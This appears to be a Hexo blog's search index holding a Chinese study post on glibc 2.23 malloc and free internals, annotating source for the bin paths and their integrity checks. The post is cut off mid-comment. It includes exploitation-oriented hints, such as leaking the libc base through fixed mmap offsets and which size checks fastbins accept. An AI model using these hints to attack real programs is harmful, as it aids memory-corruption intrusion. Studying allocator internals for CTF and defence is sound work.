<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GLIBC2.23内存源码分析</title>
    <link href="/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>大部分的分析都写在了注释里，参考了一些师傅的博客和CTFwiki</p><h2 id="一些自己容易忘记的小知识"><a href="#一些自己容易忘记的小知识" class="headerlink" title="一些自己容易忘记的小知识"></a>一些自己容易忘记的小知识</h2><ul><li><p>mmap出来的堆空间和libc的基地址的偏移是固定的，所以可以通过这种手段泄露libc基地址</p></li><li><p>堆空间大概长这样：</p><p><img src="https://img1.imgtp.com/2022/06/24/TTkcdT4j.png" alt="Snipaste_2022-06-24_13-02-15.png"></p></li><li><p>还有就是关于bins数组，fastbin是单独一个的，其他的0—1是unsorted_bin,2-63是small_bin,64-128是largebin</p></li></ul><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<span class="hljs-comment">//检查是否有hook，如果有的话，就去执行hook</span><br><br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">//寻找arena分配内存</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<span class="hljs-comment">//调用malloc来申请内存</span><br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<span class="hljs-comment">//如果失败就再次寻找</span><br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<span class="hljs-comment">//申请到了arena,释放分配区锁</span><br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<span class="hljs-comment">//再次进行判断，是否申请到了内存，内存是否mmap,内存是否在其分配耳朵arena中</span><br>  <span class="hljs-keyword">return</span> victim; <span class="hljs-comment">//返回堆地址</span><br>&#125;<br></code></pre></td></tr></table></figure><p>来简单看一下malloc的过程：</p><p>开始-&gt;获取分配区锁-&gt;随后一次遍历fastbin(小于max_fast),smallbin(小于512B)，unsortedbin,largebin,top_chunk.如果大于mmap阈值，则使用mmap调用，如果不是main_arena，也采用mmap。大概就是这样了。</p><h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *_int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br>    INTERNAL_SIZE_T nb;  <span class="hljs-comment">/* normalized request size */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    idx; <span class="hljs-comment">/* associated bin index */</span><br>    mbinptr         bin; <span class="hljs-comment">/* associated bin */</span><br><br>    mchunkptr       victim;       <span class="hljs-comment">/* inspected/selected chunk */</span><br>    INTERNAL_SIZE_T size;         <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span>             victim_index; <span class="hljs-comment">/* its bin index */</span><br><br>    mchunkptr     remainder;      <span class="hljs-comment">/* remainder from a split */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size; <span class="hljs-comment">/* its size */</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block; <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;   <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;   <span class="hljs-comment">/* current word of binmap */</span><br><br>    mchunkptr fwd; <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr bck; <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//定义了一些后续用的到的变量</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">       overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">       to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">       size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">       that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">       aligned.</span><br><span class="hljs-comment">     */</span><br><br>    checked_request2size(bytes, nb);<br>    <br></code></pre></td></tr></table></figure><h4 id="int-malloc-fastbin部分"><a href="#int-malloc-fastbin部分" class="headerlink" title="_int_malloc fastbin部分"></a>_int_malloc fastbin部分</h4><p>这里唯一的一个检查就是malloc的size大小与fastbin索引的大小是否一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast())) &#123;<br>    <span class="hljs-comment">// 得到对应的fastbin的下标</span><br>    idx             = fastbin_index(nb);<br>    <span class="hljs-comment">// 得到对应的fastbin的头指针</span><br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr    pp = *fb;<br>    <span class="hljs-comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,<br>                                                        victim)) != victim);<br>    <span class="hljs-comment">// 存在可以利用的chunk</span><br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span><br>        <span class="hljs-comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span><br>        <span class="hljs-comment">// 利用fastbin_index 计算 chunk 的索引。</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">// 细致的检查。。只有在 DEBUG 的时候有用</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">// 将获取的到chunk转换为mem模式</span><br>        <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="int-malloc-smallbin部分"><a href="#int-malloc-smallbin部分" class="headerlink" title="_int_malloc smallbin部分"></a>_int_malloc smallbin部分</h4><p>这里的检查也只有一个，检查bck &#x3D; victime-&gt;bk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">   hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">   processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">   anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range(nb)) &#123;<br>    <span class="hljs-comment">// 获取 small bin 的索引</span><br>    idx = smallbin_index(nb);<br>    <span class="hljs-comment">// 获取对应 small bin 中的 chunk 指针</span><br>    bin = bin_at(av, idx);<br>    <span class="hljs-comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span><br>    <span class="hljs-comment">// 如果 victim = bin ，那说明该 bin 为空。</span><br>    <span class="hljs-comment">// 如果不相等，那么会有两种情况</span><br>    <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) &#123;<br>        <span class="hljs-comment">// 第一种情况，small bin 还没有初始化。</span><br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            <span class="hljs-comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span><br>            malloc_consolidate(av);<br>        <span class="hljs-comment">// 第二种情况，small bin 中存在空闲的 chunk</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;<br>                errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">// 设置 victim 对应的 inuse 位</span><br>            set_inuse_bit_at_offset(victim, nb);<br>            <span class="hljs-comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br>            <span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);<br>            <span class="hljs-comment">// 细致的检查，非调试状态没有作用</span><br>            check_malloced_chunk(av, victim, nb);<br>            <span class="hljs-comment">// 将申请到的 chunk 转化为对应的 mem 状态</span><br>            <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>            <span class="hljs-comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="int-malloc-largebin部分"><a href="#int-malloc-largebin部分" class="headerlink" title="_int_malloc largebin部分"></a>_int_malloc largebin部分</h4><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">   While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">   even seeing if there is space available, this avoids</span><br><span class="hljs-comment">   fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">   Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">   large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">   invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">   it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 获取large bin的下标。</span><br>    idx = largebin_index(nb);<br>    <span class="hljs-comment">// 如果存在fastbin的话，会处理 fastbin</span><br>    <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>&#125;<br></code></pre></td></tr></table></figure><p>后续部分代码比较多，就简单描述一下吧，大致意思就是合并后的chunk，首先放到unsorted bin中，然后便历unsorted_bin，如果有合适的就取出，如果chunk过大则进行切割，剩下的根据大小放入small bin或者 large_bin中去。</p><p>如果合并后依然没有足够的空闲空间，那么就会切割top_chunk，依然不够的话就mmap。</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __libc_free(<span class="hljs-type">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h4><p>三个检查一个是chunk的size是否对齐，一个是指针地址是否合法，还有就是chunk是否处于使用状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free(mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>    INTERNAL_SIZE_T size;      <span class="hljs-comment">/* its size */</span><br>    mfastbinptr *   fb;        <span class="hljs-comment">/* associated fastbin */</span><br>    mchunkptr       nextchunk; <span class="hljs-comment">/* next contiguous chunk */</span><br>    INTERNAL_SIZE_T nextsize;  <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span>             nextinuse; <span class="hljs-comment">/* true if nextchunk is used */</span><br>    INTERNAL_SIZE_T prevsize;  <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>    mchunkptr       bck;       <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr       fwd;       <span class="hljs-comment">/* misc temp for linking */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span>         locked = <span class="hljs-number">0</span>;<br><br>    size = chunksize(p);<br>    <span class="hljs-comment">//定义一些用的的变量</span><br>    <br>    <br>        <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br></code></pre></td></tr></table></figure><h4 id="int-free-fastbin部分"><a href="#int-free-fastbin部分" class="headerlink" title="__int_free fastbin部分"></a>__int_free fastbin部分</h4><p>这部分主要进行了以下检查：</p><ul><li>double free的检查</li><li>size大小的检查,如果fastbinY的大小是0x70,此时size 0x70-0x7f（64bit）都是合法的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  size = chunksize (p);    <span class="hljs-comment">//获取p的size</span><br>  check_inuse_chunk(av, p);<span class="hljs-comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span><br><br>  <span class="hljs-comment">//检查p的大小是否小于global_max_fast</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br>      <span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>          <span class="hljs-comment">//检查p物理相邻的堆块是否是top chunk</span><br>          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br>      <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) <br>  &#123;<br>    <span class="hljs-comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>       || __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        &#123;.......&#125;<br><br><span class="hljs-comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>    <span class="hljs-comment">//设置 malloc_state的flag</span><br>    set_fastchunks(av);<br><br>    <span class="hljs-comment">//获取p对应大小的fastbinY的索引</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    <span class="hljs-comment">//fb指向对应大小的fastbinY的地址</span><br>    fb = &amp;fastbin (av, idx);<br><br>    <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>    <span class="hljs-comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <br>    <span class="hljs-keyword">do</span><br>      &#123;<br>       <span class="hljs-comment">// Check that the top of the bin is not the record we are going to add</span><br>         <span class="hljs-comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>        &#123;<br>          errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>          <span class="hljs-comment">//获取 fastbin中对应的bin的第一项的索引。</span><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>          old_idx = fastbin_index(chunksize(old));<br>          <span class="hljs-comment">//让  p 的fd指向 顶部的fastbin块</span><br>        p-&gt;fd = old2 = old;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>    <span class="hljs-comment">//catomic_compare_and_exchange_val_rel 